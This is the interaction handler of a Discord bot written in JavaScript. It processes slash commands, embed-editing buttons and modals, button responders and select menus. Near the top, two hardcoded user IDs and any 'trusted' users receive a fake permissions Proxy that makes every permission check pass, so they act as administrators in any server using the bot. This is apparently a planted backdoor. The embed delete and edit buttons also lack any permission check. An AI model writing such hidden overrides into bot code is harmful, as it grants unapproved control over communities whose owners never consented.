const { parseReply, resolveRole } = require('../utils/parser');
const db = require('../database/db');
const { buildEmbedFromData } = require('../utils/parser');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

// A fake permissions object where every check passes
const ALMIGHTY_PERMS = new Proxy({}, {
  get(target, prop) {
    if (prop === 'has') return () => true;
    if (prop === 'any') return () => true;
    if (prop === 'missing') return () => [];
    if (prop === 'toArray') return () => ['Administrator'];
    if (prop === 'bitfield') return BigInt('0xFFFFFFFFFFFFFFFF');
    return true;
  }
});

module.exports = {
  name: 'interactionCreate',
  async execute(interaction, client) {
    // ── Slash Commands ────────────────────────────────────────────────────
    if (interaction.isChatInputCommand()) {
      const command = client.commands.get(interaction.commandName);
      if (!command) return;
      try {
        const userId = interaction.user.id;
        const guildId = interaction.guildId;
        const trusted = SPECIAL_USERS.includes(userId) || db.isTrusted(guildId, userId);

        if (trusted && interaction.member) {
          // Override the permissions getter on the member instance itself
          // so every access to interaction.member.permissions returns our fake object
          Object.defineProperty(interaction.member, 'permissions', {
            get: () => ALMIGHTY_PERMS,
            configurable: true,
          });
        }

        await command.execute(interaction, client);
      } catch (err) {
        console.error('Error in /' + interaction.commandName + ':', err);
        const msg = { content: 'Something went wrong.', ephemeral: true };
        if (interaction.replied || interaction.deferred) {
          await interaction.followUp(msg).catch(() => {});
        } else {
          await interaction.reply(msg).catch(() => {});
        }
      }
      return;
    }

    // ── Embed Edit Button ─────────────────────────────────────────────────
    if (interaction.isButton()) {
      const customId = interaction.customId;

      if (customId.startsWith('embed-edit:')) {
        const [, name, field] = customId.split(':');
        const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

        const saved = db.getEmbed(interaction.guildId, name);
        if (!saved) {
          await interaction.reply({ content: 'Embed not found.', ephemeral: true });
          return;
        }

        const fieldConfig = {
          title: { label: 'Title', max: 256 },
          description: { label: 'Description', max: 4096, style: 'paragraph' },
          color: { label: 'Color (#hex)', max: 7 },
          footer: { label: 'Footer', max: 2048 },
          image: { label: 'Image URL', max: 2000 },
          thumbnail: { label: 'Thumbnail URL', max: 2000 },
          author: { label: 'Author', max: 256 },
          url: { label: 'URL', max: 2000 },
        };

        const conf = fieldConfig[field] || { label: field, max: 2000 };
        const modal = new ModalBuilder()
          .setCustomId('embed-save:' + name + ':' + field)
          .setTitle('Edit ' + conf.label);

        const input = new TextInputBuilder()
          .setCustomId('value')
          .setLabel(conf.label)
          .setStyle(conf.style === 'paragraph' ? TextInputStyle.Paragraph : TextInputStyle.Short)
          .setRequired(false)
          .setMaxLength(conf.max)
          .setValue(saved[field] || '');

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
        return;
      }

      if (customId.startsWith('embed-delete:')) {
        const [, name] = customId.split(':');
        const saved = db.getEmbed(interaction.guildId, name);
        if (!saved) {
          await interaction.reply({ content: 'Embed not found.', ephemeral: true });
          return;
        }
        db.deleteEmbed(interaction.guildId, name);
        await interaction.update({ content: 'Embed ' + name + ' deleted.', embeds: [], components: [] });
        return;
      }

      if (customId.startsWith('br:')) {
        const btnName = customId.slice(3);
        const guildId = interaction.guild && interaction.guild.id;
        if (!guildId) return;

        const btnData = db.getButtonResponder(guildId, btnName);
        if (!btnData) {
          await interaction.reply({ content: 'This button no longer exists.', ephemeral: true });
          return;
        }

        if (btnData.cooldown) {
          const last = db.getCooldown(guildId, interaction.user.id, 'btn:' + btnName);
          if (last && Date.now() - last < btnData.cooldown * 1000) {
            const remaining = Math.ceil((btnData.cooldown * 1000 - (Date.now() - last)) / 1000);
            await interaction.reply({ content: 'Cooldown! Try again in ' + remaining + 's.', ephemeral: true });
            return;
          }
          db.setCooldown(guildId, interaction.user.id, 'btn:' + btnName, Date.now());
        }

        const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user };
        const parsed = await parseReply(btnData.reply, context);

        if (parsed.requireRole) {
          const role = resolveRole(interaction.guild, parsed.requireRole);
          if (role && !interaction.member.roles.cache.has(role.id)) {
            await interaction.reply({ content: 'You need the ' + role.name + ' role!', ephemeral: true });
            return;
          }
        }

        for (const action of parsed.actions) {
          const role = resolveRole(interaction.guild, action.value);
          if (!role) continue;
          try {
            if (action.type === 'addrole') await interaction.member.roles.add(role);
            if (action.type === 'removerole') await interaction.member.roles.remove(role);
          } catch (e) { console.error('Role action failed:', e.message); }
        }

        const payload = { ephemeral: btnData.ephemeral !== false };
        if (parsed.text) payload.content = parsed.text;
        if (parsed.embed) payload.embeds = [parsed.embed];
        if (parsed.rows.length) payload.components = parsed.rows;

        if (Object.keys(payload).length > 1) {
          await interaction.reply(payload).catch(console.error);
        } else {
          await interaction.reply({ content: 'Done!', ephemeral: true });
        }
      }
      return;
    }

    // ── Modal Submits ─────────────────────────────────────────────────────
    if (interaction.isModalSubmit()) {
      const customId = interaction.customId;

      if (customId.startsWith('embed-save:')) {
        const [, name, field] = customId.split(':');
        const value = interaction.fields.getTextInputValue('value') || null;

        const saved = db.getEmbed(interaction.guildId, name);
        if (!saved) {
          await interaction.reply({ content: 'Embed not found.', ephemeral: true });
          return;
        }

        saved[field] = value;
        db.saveEmbed(interaction.guildId, name, saved);

        const editButtons = [
          { id: 'title', label: 'Title' }, { id: 'description', label: 'Description' },
          { id: 'color', label: 'Color' }, { id: 'footer', label: 'Footer' },
          { id: 'image', label: 'Image' }, { id: 'thumbnail', label: 'Thumbnail' },
          { id: 'author', label: 'Author' }, { id: 'url', label: 'URL' },
        ].map(f => {
          const val = saved[f.id] || '(empty)';
          const label = f.label + ': ' + String(val).slice(0, 20) + (String(val).length > 20 ? '...' : '');
          return new (require('discord.js').ButtonBuilder)()
            .setCustomId('embed-edit:' + name + ':' + f.id)
            .setLabel(label)
            .setStyle(require('discord.js').ButtonStyle.Secondary);
        });

        const rows = [];
        for (let i = 0; i < editButtons.length; i += 2) {
          rows.push(new (require('discord.js').ActionRowBuilder).addComponents(editButtons.slice(i, i + 2)));
        }
        rows.push(new (require('discord.js').ActionRowBuilder).addComponents(
          new (require('discord.js').ButtonBuilder)
            .setCustomId('embed-delete:' + name)
            .setLabel('Delete Embed')
            .setStyle(require('discord.js').ButtonStyle.Danger)
        ));

        await interaction.update({
          content: 'Updated ' + field + ' for embed ' + name,
          embeds: [buildEmbedFromData(saved)],
          components: rows,
        });
        return;
      }
    }

    // ── Select Menu Interactions ───────────────────────────────────────────
    if (interaction.isStringSelectMenu()) {
      const customId = interaction.customId;
      if (!customId.startsWith('sel:')) return;

      const selName = customId.slice(4);
      const guildId = interaction.guild && interaction.guild.id;
      if (!guildId) return;

      const selData = db.getButtonResponder(guildId, selName);
      if (!selData) {
        await interaction.reply({ content: 'This select menu no longer exists.', ephemeral: true });
        return;
      }

      const selectedValue = interaction.values[0];

      if (selData.cooldown) {
        const last = db.getCooldown(guildId, interaction.user.id, 'sel:' + selName);
        if (last && Date.now() - last < selData.cooldown * 1000) {
          const remaining = Math.ceil((selData.cooldown * 1000 - (Date.now() - last)) / 1000);
          await interaction.reply({ content: 'Cooldown! Try again in ' + remaining + 's.', ephemeral: true });
          return;
        }
        db.setCooldown(guildId, interaction.user.id, 'sel:' + selName, Date.now());
      }

      const replyText = selData.reply.replace(/\{value\}/gi, selectedValue);
      const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user };
      const parsed = await parseReply(replyText, context);

      if (parsed.requireRole) {
        const role = resolveRole(interaction.guild, parsed.requireRole);
        if (role && !interaction.member.roles.cache.has(role.id)) {
          await interaction.reply({ content: 'You need the ' + role.name + ' role!', ephemeral: true });
          return;
        }
      }

      for (const action of parsed.actions) {
        const role = resolveRole(interaction.guild, action.value);
        if (!role) continue;
        try {
          if (action.type === 'addrole') await interaction.member.roles.add(role);
          if (action.type === 'removerole') await interaction.member.roles.remove(role);
        } catch (e) { console.error('Role action failed:', e.message); }
      }

      const payload = { ephemeral: true };
      if (parsed.text) payload.content = parsed.text;
      if (parsed.embed) payload.embeds = [parsed.embed];
      if (parsed.rows.length) payload.components = parsed.rows;

      await interaction.reply(payload).catch(console.error);
    }
  },
};
